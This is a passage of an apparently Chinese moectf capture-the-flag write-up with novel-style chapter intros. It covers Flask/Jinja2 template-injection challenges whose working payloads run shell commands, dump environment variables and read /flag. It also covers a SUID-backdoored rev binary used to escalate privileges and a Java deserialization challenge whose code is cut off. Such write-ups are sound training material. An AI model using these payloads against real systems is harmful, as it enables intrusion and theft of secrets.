punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:40563&#x2F;?username&#x3D;&#123;&#123;cycler.__init__.__globals__[&#39;os&#39;].popen(&#39;env&#39;).read()&#125;&#125;&amp;password&#x3D;1</code></pre><pre class="language-none"><code class="language-none">moectf&#123;02941eab-7adb-d9d0-69bc-4a2dc9086bfa&#125;</code></pre><h2 id="第二十一章-往生漩涡言灵死局">21 第二十一章往生漩涡·言灵死局</h2><blockquote><p>往生漩涡的边缘，血浪滔天。万魂幡摇动间，无数怨魂从漩涡中爬出，化作实体化的血色魔兵。为首魔修身高丈二，血袍上绣着九颗噬心图案——正是噬心魔宗九心长老！</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token string">"global"</span><span class="token punctuation">,</span> <span class="token string">"&#123;&#123;"</span><span class="token punctuation">,</span> <span class="token string">"&#125;&#125;"</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args <span class="token keyword">or</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>            login_msg <span class="token operator">=</span> <span class="token triple-quoted-string string">"""            &lt;div class="login-result" id="result">                &lt;div class="result-title">阵法反馈&lt;/div>                &lt;div id="result-content">&lt;div class='login-fail'>用户名或密码不能为空&lt;/div>&lt;/div>            &lt;/div>            """</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            login_msg <span class="token operator">=</span> render_template_string<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"""            &lt;div class="login-result" id="result">                &lt;div class="result-title">阵法反馈&lt;/div>                &lt;div id="result-content">&lt;div class='login-success'>欢迎：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/div>&lt;/div>            &lt;/div>            """</span></span><span class="token punctuation">)</span>            <span class="token keyword">for</span> blk <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>                <span class="token keyword">if</span> blk <span class="token keyword">in</span> username<span class="token punctuation">:</span>                    login_msg <span class="token operator">=</span> <span class="token triple-quoted-string string">"""                    &lt;div class="login-result" id="result">                        &lt;div class="result-title">阵法反馈&lt;/div>                        &lt;div id="result-content">&lt;div class='login-fail'>Error&lt;/div>&lt;/div>                    &lt;/div>                    """</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        login_msg <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> login_msg<span class="token operator">=</span>login_msg<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:1378&#x2F;?username&#x3D;&#123;% set du&#x3D;&#39;_&#39;~&#39;_&#39; %&#125;&#123;% set gi&#x3D;du~&#39;getitem&#39;~du %&#125;&#123;% set bk&#x3D;du~&#39;builtins&#39;~du %&#125;&#123;% set ik&#x3D;du~&#39;import&#39;~du %&#125;&#123;% set nk&#x3D;du~&#39;name&#39;~du %&#125;&#123;% set sc&#x3D;&#39;&#39;|attr(du~&#39;class&#39;~du)|attr(du~&#39;mro&#39;~du)|attr(gi)(-1)|attr(du~&#39;subclasses&#39;~du)() %&#125;&#123;% for c in sc %&#125;&#123;% if c|attr(nk)&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;% set w&#x3D;c() %&#125;&#123;% set m&#x3D;w|attr(&#39;_module&#39;) %&#125;&#123;% set md&#x3D;m|attr(du~&#39;dict&#39;~du) %&#125;&#123;% set b&#x3D;md|attr(gi)(bk) %&#125;&#123;% set imp&#x3D;b|attr(gi)(ik) %&#125;&#123;% set os&#x3D;imp(&#39;os&#39;) %&#125;&#123;% set envs&#x3D;os|attr(&#39;popen&#39;)(&#39;env&#39;)|attr(&#39;read&#39;)() %&#125;&lt;pre&gt;&#123;% print(envs) %&#125;&lt;&#x2F;pre&gt;&#123;% endif %&#125;&#123;% endfor %&#125;&amp;password&#x3D;1</code></pre><pre class="language-none"><code class="language-none">moectf&#123;b603bff7-2595-9703-5449-640a7b6fea44&#125;</code></pre><h2 id="第二十二章-血海核心千年手段">22 第二十二章血海核心·千年手段</h2><blockquote><p>漩涡深处竟是别有洞天。一座由白骨堆砌的宫殿矗立在血海核心，殿门笼罩着血色光幕，上面流转着比言灵死局更复杂的符文。</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args <span class="token keyword">or</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>            login_msg <span class="token operator">=</span> <span class="token triple-quoted-string string">"""            &lt;div class="login-result" id="result">                &lt;div class="result-title">阵法反馈&lt;/div>                &lt;div id="result-content">&lt;div class='login-fail'>用户名或密码不能为空&lt;/div>&lt;/div>            &lt;/div>            """</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            login_msg <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""            &lt;div class="login-result" id="result">                &lt;div class="result-title">阵法反馈&lt;/div>                &lt;div id="result-content">&lt;div class='login-success'>Welcome: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/div>&lt;/div>            &lt;/div>            """</span></span>            render_template_string<span class="token punctuation">(</span>login_msg<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        login_msg <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> login_msg<span class="token operator">=</span>login_msg<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><p><a href="https://www.cnblogs.com/shinnylbz/p/18572680">jinjia2无回显SSTI -colorfullbz - 博客园</a></p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:50094&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;dir.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;dir ..&#x2F;&#39;).read() ) &#125;&#125;&amp;password&#x3D;1http:&#x2F;&#x2F;127.0.0.1:50094&#x2F;static&#x2F;dir.txt</code></pre><pre class="language-none"><code class="language-none">app  boot  entrypoint.sh  flaglib    media  opt   root  sbinsys  usrbin  dev   etc  homelib64  mnt    proc  run   srvtmp  var</code></pre><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:50094&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;flag.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat ..&#x2F;flag&#39;).read() ) &#125;&#125;&amp;password&#x3D;1http:&#x2F;&#x2F;127.0.0.1:50094&#x2F;static&#x2F;flag.txt</code></pre><p>发现了<code>flag</code>无法读取，必须想办法绕过权限问题。试试<code>SUID</code>。</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;suid.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;find &#x2F; -perm -4000 -type f 2&gt;&#x2F;dev&#x2F;null&#39;).read() ) &#125;&#125;&amp;password&#x3D;1http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;static&#x2F;suid.txt&#x2F;usr&#x2F;bin&#x2F;rev&#x2F;usr&#x2F;bin&#x2F;mount&#x2F;usr&#x2F;bin&#x2F;passwd&#x2F;usr&#x2F;bin&#x2F;su&#x2F;usr&#x2F;bin&#x2F;chsh&#x2F;usr&#x2F;bin&#x2F;chfn&#x2F;usr&#x2F;bin&#x2F;gpasswd&#x2F;usr&#x2F;bin&#x2F;umount&#x2F;usr&#x2F;bin&#x2F;newgrp&#x2F;usr&#x2F;bin&#x2F;sudo</code></pre><p>逆向检查一下<code>/rev</code>。</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;main_disassembly.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;objdump -d &#x2F;usr&#x2F;bin&#x2F;rev | grep -A 30 main&#39;).read() ) &#125;&#125;&amp;password&#x3D;1http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;static&#x2F;main_disassembly.txt</code></pre><pre class="language-assembly" data-language="assembly"><code class="language-assembly">1175: 48 8b 00             mov    (%rax),%rax1178: 48 89 c6             mov    %rax,%rsi</code></pre><p>这里，程序把输入的第一个参数（比如 <code>ssdDH--</code>）放到了<code>%rsi</code> 寄存器里，准备进行比较。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">117b: 48 8d 05 82 0e 00 00 lea    0xe82(%rip),%rax        # 2004 &lt;_IO_stdin_used+0x4&gt;1182: 48 89 c7             mov    %rax,%rdi</code></pre><p>程序从内存地址 <code>0x2004</code> 加载了一个字符串，并把它放到了<code>%rdi</code> 寄存器里。这个地址 <code>0x2004</code> 正是我们之前在<code>.rodata</code> 区看到的 <code>--HDdss</code>字符串的起始位置。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">1185: e8 a6 fe ff ff       call   1030 &lt;strcmp@plt&gt;118a: 85 c0                test   %eax,%eax118c: 75 3e                jne    11cc &lt;main+0x83&gt;</code></pre><p>程序调用 <code>strcmp</code> 来比较输入的参数（在<code>%rsi</code>）和隐藏的密码 <code>--HDdss</code>（在<code>%rdi</code>）。如果两个字符串不相等(<code>jne</code>)，程序就会直接跳到后面，什么也不做。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">11be: 48 8b 00             mov    (%rax),%rax11c1: 48 89 d6             mov    %rdx,%rsi11c4: 48 89 c7             mov    %rax,%rdi11c7: e8 74 fe ff ff       call   1040 &lt;execvp@plt&gt;</code></pre><p>程序把输入的第二个参数作为要执行的命令，把输入的第三个参数作为命令的参数，然后调用<code>execvp</code> 来执行！</p><p>这个伪装的 <code>rev</code>程序是一个通用的提权工具，它的用法是：</p><p><code>/usr/bin/rev [密码] [要执行的命令] [命令的参数]</code></p><ul><li><strong>密码</strong>：就是我们找到的 <code>--HDdss</code>。</li><li><strong>要执行的命令</strong>：可以指定任何我们想执行的命令，比如<code>/bin/cat</code>。</li><li><strong>命令的参数</strong>：就是 <code>/flag</code>！</li></ul><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;?username&#x3D;&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or url_for.__globals__.__builtins__.__import__(&#39;builtins&#39;).open(&#39;static&#x2F;final_flag.txt&#39;,&#39;w&#39;).write( url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;&#x2F;usr&#x2F;bin&#x2F;rev --HDdss &#x2F;bin&#x2F;cat &#x2F;flag&#39;).read() ) &#125;&#125;&amp;password&#x3D;1http:&#x2F;&#x2F;127.0.0.1:51925&#x2F;static&#x2F;final_flag.txt</code></pre><pre class="language-none"><code class="language-none">moectf&#123;8c20281d-8245-18ad-8dae-fe437a5ccd77&#125;</code></pre><h2 id="第二十三章-幻境迷心皇陨星沉大结局">23 第二十三章幻境迷心·皇陨星沉(大结局)</h2><blockquote><p>两个环境解释：</p><p>题目在容器dog-app(环境里只有sh,反弹shell时建议使用nc)</p><p>rev-shel(堡垒机)请使用ssh（root:root123）登录,可以做反弹shell（请用nc）或外带数据的服务端(两容器完全共享同一个网卡，相互访问ip都是127.0.0.1，但端口不要冲突)</p><p>省流：题目环境使用openjdk8</p></blockquote><pre class="language-none"><code class="language-none">jar xf demo.jar </code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">Dog</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Objects</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">,</span> <span class="token class-name">DogModel</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token class-name">String</span> breed<span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token keyword">int</span> hunger<span class="token punctuation">;</span>   <span class="token class-name">Object</span> object<span class="token punctuation">;</span>   <span class="token class-name">String</span> methodName<span class="token punctuation">;</span>   <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">;</span>   <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> breed<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>breed <span class="token operator">=</span> breed<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>hunger <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getBreed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>breed<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getHunger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>hunger<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>hunger <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>hunger <span class="token operator">-</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> o<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">Dog</span> dog <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Dog</span><span class="token punctuation">)</span>o<span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">==</span> dog<span class="token punctuation">.</span>id<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wagTail</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>object<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>methodName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>paramTypes<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">Dog</span><span class="token punctuation">.</span><span class="token class-name">Dog</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">Dog</span><span class="token punctuation">.</span><span class="token class-name">DogService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">DeleteMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PathVariable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/dogs"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DogController</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">DogService</span> dogService<span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token class-name">DogController</span><span class="token punctuation">(</span><span class="token class-name">DogService</span> dogService<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>dogService <span class="token operator">=</span> dogService<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@GetMapping</span>   <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Dog</span><span class="token punctuation">></span></span> <span class="token function">getAllDogs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>dogService<span class="token punctuation">.</span><span class="token function">getAllDogs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@PostMapping</span>   <span class="token keyword">public</span> <span class="token class-name">Dog</span> <span class="token function">addDog</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> breed<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>dogService<span class="token punctuation">.</span><span class="token function">addDog</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> breed<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/&#123;id&#125;/feed"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token class-name">Dog</span> <span class="token function">feedDog</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>dogService<span class="token punctuation">.</span><span class="token function">feedDog</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@DeleteMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/&#123;id&#125;"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token class-name">Dog</span> <span class="token function">removeDog</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>dogService<span class="token 